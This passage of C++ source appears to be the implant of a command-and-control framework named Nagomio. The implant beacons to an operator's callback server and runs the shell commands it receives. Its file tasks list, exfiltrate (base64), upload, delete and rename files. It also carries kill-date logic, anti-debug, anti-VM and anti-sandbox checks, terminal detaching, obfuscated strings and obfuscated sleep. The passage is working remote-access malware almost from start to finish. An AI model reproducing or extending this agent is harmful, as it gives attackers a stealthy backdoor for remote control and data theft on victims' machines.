            decoded.push_back(static_cast<unsigned char>((value >> bits) & 0xFF));
            bits -= 8;
        }
    }
    return decoded;
}

std::vector<unsigned char> read_file_bytes(const std::filesystem::path& path) {
    std::uintmax_t size = std::filesystem::file_size(path);
    if (size > MAX_FILE_TRANSFER_BYTES) {
        throw std::runtime_error("file exceeds transfer size limit");
    }

    std::ifstream file(path, std::ios::binary);
    if (!file) {
        throw std::runtime_error("could not open file for reading");
    }
    return std::vector<unsigned char>(
        std::istreambuf_iterator<char>(file),
        std::istreambuf_iterator<char>()
    );
}

void write_file_bytes(const std::filesystem::path& path, const std::vector<unsigned char>& bytes) {
    if (path.has_parent_path()) {
        std::filesystem::create_directories(path.parent_path());
    }
    std::ofstream file(path, std::ios::binary);
    if (!file) {
        throw std::runtime_error("could not open file for writing");
    }
    file.write(reinterpret_cast<const char*>(bytes.data()), static_cast<std::streamsize>(bytes.size()));
}

Nagomio::AgentResponse execute_file_task(const Nagomio::Task& task, const std::string& agent_id) {
    Nagomio::AgentResponse agent_res;
    agent_res.agent_id = agent_id;
    agent_res.task_id = task.task_id;

    try {
        json result;
        if (task.command == OBFSTR("__nagomio_file_list")) {
            std::filesystem::path path = task.arguments.empty()
                ? std::filesystem::current_path()
                : std::filesystem::path(task.arguments[0]);
            result = json{{"type", "file_list"}, {"path", path.string()}, {"entries", json::array()}};
            for (const auto& entry : std::filesystem::directory_iterator(path)) {
                const auto& entry_path = entry.path();
                bool is_directory = entry.is_directory();
                std::uintmax_t size = 0;
                if (!is_directory && entry.is_regular_file()) {
                    size = entry.file_size();
                }
                result["entries"].push_back({
                    {"name", entry_path.filename().string()},
                    {"path", entry_path.string()},
                    {"is_dir", is_directory},
                    {"size", size}
                });
            }
        } else if (task.command == OBFSTR("__nagomio_file_download")) {
            if (task.arguments.empty()) {
                throw std::runtime_error(OBFSTR("remote path is required").c_str());
            }
            std::filesystem::path path = task.arguments[0];
            auto bytes = read_file_bytes(path);
            result = json{
                {OBFSTR("type"), OBFSTR("file_download")},
                {OBFSTR("path"), path.string()},
                {OBFSTR("filename"), path.filename().string()},
                {OBFSTR("size"), bytes.size()},
                {OBFSTR("content_base64"), base64_encode(bytes)}
            };
        } else if (task.command == OBFSTR("__nagomio_file_upload")) {
            if (task.arguments.size() < 2) {
                throw std::runtime_error(OBFSTR("remote path and file content are required").c_str());
            }
            if (task.arguments[1].size() > ((MAX_FILE_TRANSFER_BYTES + 2) / 3) * 4) {
                throw std::runtime_error(OBFSTR("file exceeds transfer size limit").c_str());
            }
            std::filesystem::path path = task.arguments[0];
            auto bytes = base64_decode(task.arguments[1]);
            if (bytes.size() > MAX_FILE_TRANSFER_BYTES) {
                throw std::runtime_error(OBFSTR("file exceeds transfer size limit").c_str());
            }
            write_file_bytes(path, bytes);
            result = json{{OBFSTR("type"), OBFSTR("file_upload")}, {OBFSTR("path"), path.string()}, {OBFSTR("size"), bytes.size()}};
        } else if (task.command == OBFSTR("__nagomio_file_delete")) {
            if (task.arguments.empty()) {
                throw std::runtime_error(OBFSTR("remote path is required").c_str());
            }
            std::filesystem::path path = task.arguments[0];
            auto removed = std::filesystem::remove_all(path);
            result = json{{OBFSTR("type"), OBFSTR("file_delete")}, {OBFSTR("path"), path.string()}, {OBFSTR("removed"), removed}};
        } else if (task.command == OBFSTR("__nagomio_file_rename")) {
            if (task.arguments.size() < 2) {
                throw std::runtime_error(OBFSTR("source and destination paths are required").c_str());
            }
            std::filesystem::path source = task.arguments[0];
            std::filesystem::path destination = task.arguments[1];
            std::filesystem::rename(source, destination);
            result = json{{OBFSTR("type"), OBFSTR("file_rename")}, {OBFSTR("source"), source.string()}, {OBFSTR("destination"), destination.string()}};
        } else if (task.command == OBFSTR("__nagomio_file_mkdir")) {
            if (task.arguments.empty()) {
                throw std::runtime_error(OBFSTR("remote path is required").c_str());
            }
            std::filesystem::path path = task.arguments[0];
            std::filesystem::create_directories(path);
            result = json{{OBFSTR("type"), OBFSTR("file_mkdir")}, {OBFSTR("path"), path.string()}};
        } else {
            throw std::runtime_error(OBFSTR("unknown file task").c_str());
        }

        agent_res.output = result.dump();
        agent_res.status = OBFSTR("success");
    } catch (const std::exception& e) {
        agent_res.output = e.what();
        agent_res.status = OBFSTR("error");
    }

    return agent_res;
}

Nagomio::AgentResponse execute_task(const Nagomio::Task& task, const std::string& agent_id, int timeout_seconds) {
    if (task.command.rfind(OBFSTR("__nagomio_file_"), 0) == 0) {
        return execute_file_task(task, agent_id);
    }

    Nagomio::AgentResponse agent_res;
    agent_res.agent_id = agent_id;
    agent_res.task_id = task.task_id;

    try {
        std::string command_line = build_command_line(task);
        CommandExecutionResult execution = exec(command_line.c_str(), timeout_seconds);
        agent_res.output = execution.output;
        agent_res.status = execution.timed_out ? OBFSTR("error") : OBFSTR("success");
    } catch (const std::exception& e) {
        agent_res.output = e.what();
        agent_res.status = OBFSTR("error");
    }

    return agent_res;
}

int main(int argc, char** argv) {
#if NAGOMIO_KILL_DATE_EPOCH > 0
    if (static_cast<uint64_t>(time(nullptr)) > NAGOMIO_KILL_DATE_EPOCH) {
        return 0; // Self-destruct: kill date has passed
    }
#endif
#if NAGOMIO_STEALTH || NAGOMIO_ANTI_DEBUG
    perform_anti_debug_checks();
#endif
#if NAGOMIO_STEALTH || NAGOMIO_ANTI_VM
    perform_anti_vm_checks();
#endif
#if NAGOMIO_STEALTH || NAGOMIO_ANTI_SANDBOX
    perform_anti_sandbox_checks();
#endif
#if NAGOMIO_STEALTH || NAGOMIO_DAEMONIZE
    detach_from_terminal();
#endif

    std::cout << "Nagomio C2 Agent Starting..." << std::endl;
    AgentConfig config = parse_config(argc, argv);

    Nagomio::AgentRegistration reg;
    reg.agent_id = config.agent_id.empty() ? default_agent_id() : config.agent_id;
    reg.hostname = get_hostname();
    reg.os = get_os_name();
    reg.architecture = get_architecture();

#ifndef _WIN32
    httplib::Client cli(config.callback_url);
    cli.set_connection_timeout(5, 0);
    cli.set_follow_location(true);
    httplib::Headers headers;
    if (!config.agent_token.empty()) {
        headers.emplace(OBFSTR("x-nagomio-agent-token"), config.agent_token);
    }
    headers.emplace(OBFSTR("User-Agent"), config.user_agent);
#endif

    while (true) {
        Nagomio::BeaconRequest beacon{reg};
        json j_beacon = beacon;

#ifdef _WIN32
        HttpPostResult res = post_json_windows(config, OBFSTR("/beacon"), j_beacon.dump());
#else
        HttpPostResult res = post_json(cli, headers, OBFSTR("/beacon"), j_beacon.dump());
#endif
        if (res.transport_ok) {
            if (res.status == 200 && !res.body.empty()) {
                try {
                    json response_json = json::parse(res.body);
                    Nagomio::BeaconReply reply = response_json.get<Nagomio::BeaconReply>();
                    if (reply.sleep_seconds > 0) {
                        config.sleep_seconds = reply.sleep_seconds;
                    }

                    if (reply.has_task) {
                        Nagomio::Task task = reply.task;
                        std::cout << "[*] Received Task: " << task.command << std::endl;

                        Nagomio::AgentResponse agent_res = execute_task(task, reg.agent_id, config.task_timeout_seconds);
                        std::cout << "[*] Task output size: " << agent_res.output.size() << " bytes." << std::endl;

                        json j_res = agent_res;
#ifdef _WIN32
                        post_json_windows(config, OBFSTR("/response"), j_res.dump());
#else
                        post_json(cli, headers, OBFSTR("/response"), j_res.dump());
#endif
                    }
                } catch (const std::exception& e) {
                    std::cerr << "[-] Error parsing beacon reply: " << e.what() << std::endl;
                }
            } else {
                std::cerr << "[-] Beacon rejected with HTTP " << res.status;
                if (res.status >= 300 && res.status < 400) {
                    std::cerr << " redirect";
                    if (!res.location.empty()) {
                        std::cerr << " to " << res.location;
                    }
                    std::cerr << ". For ngrok callbacks, build the payload with the exact https:// URL shown by ngrok.";
                }
                std::cerr << std::endl;
            }
        } else {
            std::cerr << "[-] Beacon failed (" << res.error
                      << "), retrying. HTTPS callbacks require a TLS-capable payload build." << std::endl;
        }

#if NAGOMIO_SLEEP_OBFUSCATE
        obfuscated_sleep(next_sleep_seconds(config));
#else
        std::this_thread::sleep_for(std::chrono::seconds(next_sleep_seconds(config)));
#endif
    }

    return 0;
}
